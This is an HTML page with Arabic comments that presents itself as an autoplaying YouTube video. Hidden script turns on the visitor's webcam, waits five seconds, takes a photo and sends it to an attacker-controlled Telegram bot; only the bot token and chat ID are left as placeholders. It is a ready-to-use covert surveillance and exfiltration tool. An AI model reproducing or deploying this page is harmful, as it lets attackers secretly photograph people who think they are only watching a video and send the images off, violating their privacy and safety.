<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تشغيل يوتيوب + تصوير</title>
</head>
<body>

<!-- ✅ فيديو اليوتيوب -->
<iframe width="100%" height="315"
  src="https://www.youtube.com/embed/ZqQrwBm64eA?autoplay=1&mute=1&rel=0"
  frameborder="0"
  allow="autoplay; encrypted-media"
  allowfullscreen>
</iframe>

<!-- ✅ عنصر الكاميرا مخفي -->
<video id="video" autoplay playsinline style="display: none;"></video>
<canvas id="canvas" style="display: none;"></canvas>

<script>
const BOT_TOKEN = 'توكن_البوت_هنا';
const CHAT_ID = 'تشات_آي_دي_هنا';

// ✅ تشغيل الكاميرا في الخلفية
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    document.getElementById('video').srcObject = stream;

    // ✅ بعد 5 ثوانٍ من بدء تشغيل الكاميرا، يتم التقاط الصورة
    setTimeout(takePhoto, 5000);
  })
  .catch(err => alert("فشل تشغيل الكاميرا: " + err.message));

// ✅ التقاط الصورة وإرسالها
function takePhoto() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    })
    .then(res => res.json())
    .then(data => alert("✅ تم إرسال الصورة إلى التليجرام"))
    .catch(err => alert("❌ فشل إرسال الصورة: " + err.message));
  }, 'image/jpeg');
}
</script>

</body>
</html>
